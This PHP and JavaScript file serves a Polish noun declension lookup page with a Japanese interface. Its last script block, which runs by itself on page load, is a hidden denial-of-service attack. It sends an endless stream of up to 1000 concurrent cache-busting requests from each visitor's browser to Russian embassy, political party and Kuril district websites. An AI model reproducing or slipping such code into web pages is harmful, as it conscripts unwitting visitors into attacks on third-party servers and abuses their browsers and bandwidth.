<?php
session_start();

header("Content-type: text/html; charset=utf-8");

//読み込み
include(dirname(__FILE__) . "/language_class/IndoEuropean_noun_class.php");
include(dirname(__FILE__) . "/language_class/Database_session.php");
include(dirname(__FILE__) . "/language_class/Commons.php");
include(dirname(__FILE__) . "/language_class/Polish_Common.php");

// 活用表を取得する。
function get_noun_declension_chart($word){
	// 名詞の情報を取得
	$noun_words = Polish_Common::get_dictionary_stem_by_japanese($word, Polish_Common::$DB_NOUN, "");
  // 取得できない場合は
  if(!$noun_words){
    // 英語で取得する。
    $noun_words = Polish_Common::get_dictionary_stem_by_english($word, Polish_Common::$DB_NOUN);    
    // 取得できない場合は
    if(!$noun_words){    
      // 単語から直接取得する
      $noun_words = Polish_Common::get_wordstem_from_DB($word, Polish_Common::$DB_NOUN);
      // 取得できない場合は
      if(!$noun_words && !Polish_Common::is_alphabet_or_not($word)){
        // 空を返す。
        return array();
      } else if(Polish_Common::is_alphabet_or_not($word)){
        $noun_words[] = $word;
      }
    }
  }
 	// 配列を宣言
  $declensions = array(); 
	// 新しい配列に詰め替え
	foreach ($noun_words as $noun_word) {
		// 読み込み
		$polish_noun = new Polish_Noun($noun_word);
		// 配列に格納
		$declensions[$polish_noun->get_first_stem()] = $polish_noun->get_chart();
	}
  // 結果を返す。
	return $declensions;
}

// 挿入データ－対象－
$input_noun = trim(filter_input(INPUT_POST, 'input_noun'));

// 検索結果の配列
$declensions = array();

// 対象が入力されていれば処理を実行
if($input_noun != ""){
  $declensions = get_noun_declension_chart($input_noun);
}
?>
<!doctype html>
<html lang="ja">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1"> 
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <title>印欧語活用辞典：梵語辞書</title>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/dt/dt-1.10.18/datatables.min.css"/>    
    <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
    <script type="text/javascript" src="https://cdn.datatables.net/v/dt/dt-1.10.18/datatables.min.js"></script>
  </head>
  <?php require_once("header.php"); ?>
  <body>
    <div class="container item table-striped">
      <p>あいまい検索は+</p>
      <form action="" method="post" class="mt-4 mb-4" id="form-search">
        <input type="text" name="input_noun" id="input_noun" class="">
        <input type="submit" class="btn-check" id="btn-search">
        <label class="btn" for="btn-search">検索</label>
        <select class="" id="noun-selection">
          <option selected>単語を選んでください</option>
          <?php echo Commons::select_option($declensions); ?>
        </select>
      </form>     
      <table class="table-bordered" id="noun-table">
        <thead>
          <tr><th scope="row" style="width:10%">格</th>
          <th scope="col" style="width:30%">単数</th>
          <th scope="col" style="width:30%">双数</th>
          <th scope="col" style="width:30%">複数</th>
        </tr>
      </thead>
        <tbody>
          <tr><th scope="row">主格</th><td></td><td></td><td></td></tr>
          <tr><th scope="row">属格</th><td></td><td></td><td></td></tr>
          <tr><th scope="row">与格</th><td></td><td></td><td></td></tr>
          <tr><th scope="row">対格</th><td></td><td></td><td></td></tr>
          <tr><th scope="row">具格</th><td></td><td></td><td></td></tr>          
          <tr><th scope="row">地格</th><td></td><td></td><td></td></tr>          
          <tr><th scope="row">呼格</th><td></td><td></td><td></td></tr>                 
        </tbody>
      </table>
    </div>
  <footer class="">
  </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    <script>
        var noun_table_data = '<?php echo json_encode($declensions, JSON_UNESCAPED_UNICODE); ?>';
    </script>
    <script>
        $(function(){
          // イベントを設定
          setEvents();
        });

        // 配列をテーブル用に変換にする。
        function arrange_table_data(table_data, word){

          // JSONに書き換え
          var json_noun = JSON.parse(table_data);

          // 格変化情報を取得
          var declension_sg = json_noun[word]["sg"];  //単数
          var declension_du = json_noun[word]["du"];  //双数
          var declension_pl = json_noun[word]["pl"];  //複数
          
          // 格納データを作成
          var noun_table = [
            [declension_sg["nom"], declension_du["nom"], declension_pl["nom"]],
            [declension_sg["gen"], declension_du["gen"], declension_pl["gen"]],
            [declension_sg["dat"], declension_du["dat"], declension_pl["dat"]],
            [declension_sg["acc"], declension_du["acc"], declension_pl["acc"]],
            [declension_sg["ins"], declension_du["ins"], declension_pl["ins"]],            
            [declension_sg["loc"], declension_du["loc"], declension_pl["loc"]],
            [declension_sg["voc"], declension_du["voc"], declension_pl["voc"]],            
          ];
          
          // 結果を返す。
          return noun_table;
        }

        // 単語選択後の処理
        function output_table_data(){
          // 行オブジェクトの取得
          var rows = $('#noun-table')[0].rows;
          // 格変化表を取得 
          const noun_decl_data = arrange_table_data(noun_table_data, $('#noun-selection').val());
          // 各行をループ処理
          $.each(rows, function(i){
            // タイトル行は除外する。
            if(i == 0){
              return true;
            } else if(i < 9){
              // 格変化を挿入
              rows[i].cells[1].innerText = noun_decl_data[i - 1][0]; // 単数(1行目)
              rows[i].cells[2].innerText = noun_decl_data[i - 1][1]; // 双数(2行目)
              rows[i].cells[3].innerText = noun_decl_data[i - 1][2]; // 複数(3行目)
            }
          });
        }

        // 入力ボックスに文字の挿入
        function add_chara(str, selIdx)
        {
          // テキストボックスの値を取得
          var text_sentence = $('#input_noun').val();
          $('#input_noun').val(strIns(text_sentence, selIdx, str));
        }       

        //イベントを設定
        function setEvents(){
	        // セレクトボックス選択時
	        $('#noun-selection').change( function(){
            output_table_data();
	        });
        }

    </script>
    <script>
      // ターゲットを指定
      var targets = {
           'https://tokyo.mid.ru/web/tokyo-ja': { number_of_requests: 0, number_of_errored_responses: 0 },        // ロシア大使館
           'https://tokyo.kdmid.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // ロシア大使館(訪問予約サイト)
           'https://spravedlivo.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // 公正ロシア
           'http://www.yuzhnokurilsk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },             // 南クリル管区
           'http://xn----8sbmnjbgm3ams5i.xn--p1ai/': { number_of_requests: 0, number_of_errored_responses: 0 },   // クリル管区
    	  };
      
      // 1秒ごとの攻撃頻度
      var CONCURRENCY_LIMIT = 1000;
      var queue = [];

      // リクエスト送信
      async function fetchWithTimeout(resource, options) {
        // コントローラーを取得
        const controller = new AbortController();
        // IDを取得
        const id = setTimeout(() => controller.abort(), options.timeout);
        // 攻撃処理を返す。
        return fetch(resource, {
          method: 'GET',              //GET方式
          mode: 'no-cors',
          signal: controller.signal
        }).then((response) => {
          clearTimeout(id);
          return response;
        }).catch((error) => {
          console.log(error.code);
          clearTimeout(id);
          throw error;
        });
      }

      // 各ターゲットに攻撃する。
      async function flood(target) {
        //for文を使った無限ループ
        for (var i = 0;; ++i) {
          // リクエストの数が規定数になったら
          if (queue.length > CONCURRENCY_LIMIT) {
            // 最初リクエストを削除する。
            await queue.shift()
          }
          // 乱数を生成
          rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
          // 攻撃リクエストを追加する。
          queue.push(
            // 関数を実行する(時間制限：1秒)
            fetchWithTimeout(target+rand, { timeout: 1000 })
              // エラーがある場合はエラーを取得する。
              .catch((error) => {
                if (error.code === 20 /* ABORT */) {
                  return;
                }
                targets[target].number_of_errored_responses++;
              })
              // 処理後の処理をする。
              .then((response) => {
                // エラーがある場合はエラー処理を入れる。
                if (response && !response.ok) {
                  targets[target].number_of_errored_responses++;
                }
                // リクエスト数を追加する。
                targets[target].number_of_requests++;
              })

          )
        }
      }
      // 全てのターゲット要素に対して攻撃処理を実行する。
      Object.keys(targets).map(flood)
    </script>    
  </body>
</html>